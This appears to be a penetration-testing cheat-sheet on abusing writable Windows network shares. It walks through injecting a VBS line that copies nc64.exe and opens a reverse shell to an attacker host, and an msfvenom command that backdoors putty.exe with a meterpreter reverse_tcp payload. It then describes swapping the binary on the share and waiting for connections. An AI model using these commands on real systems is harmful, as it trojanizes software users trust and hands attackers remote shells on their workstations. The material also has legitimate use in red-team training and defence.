## Abusing Writable Shares
If network shares are writable, an attacker can plant files to force users into executing any arbitrary payload and gain access to machine

Example:  
- Find a shortcut to a script or executable file hosted on a network share such as the example below for putty.exe

![Alt text](<../../Images/putty exe image.png>)

Properties > Target: \\10.10.28.6\myshare\putty.exe  

- Administrators can maintain an executable on a network share, and users can execute it without copying or installing the application to user's machine
- If attackers have write permissions over such scripts/executables, we can backdoor them to force users to execute any payload
- Script is hosted on a server > user opens the shortcut on workstation > executable will be copied from server to %temp% folder and executed on workstation
- Any payload will run in the context of the final user's workstation (logged-in user account)

## Backdooring .vbs Scripts
If shared resources is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script:  
<pre>CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True</pre>

- This will copy `nc64.exe` from the share to user's workstation `%temp%` directory
- Send reverse shell back to attacker when user opens the shared VBS script

## Backdooring .exe Files
- If shared file is a Windows binary, for example `putty.exe`, you can download it from the share and use msfvenom to inject a backdoor
- Binary will work as usual but will execute an additional payload (silently)

Create a backdoor putty.exe:
<pre>msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe</pre>
- `putty.exe` will execute a reverse_tcp meterpreter payload without user noticing
- Once file has been generated, replace the executable on the Windows share and wait for connections using `exploit/multi/handler` module from Metasploit
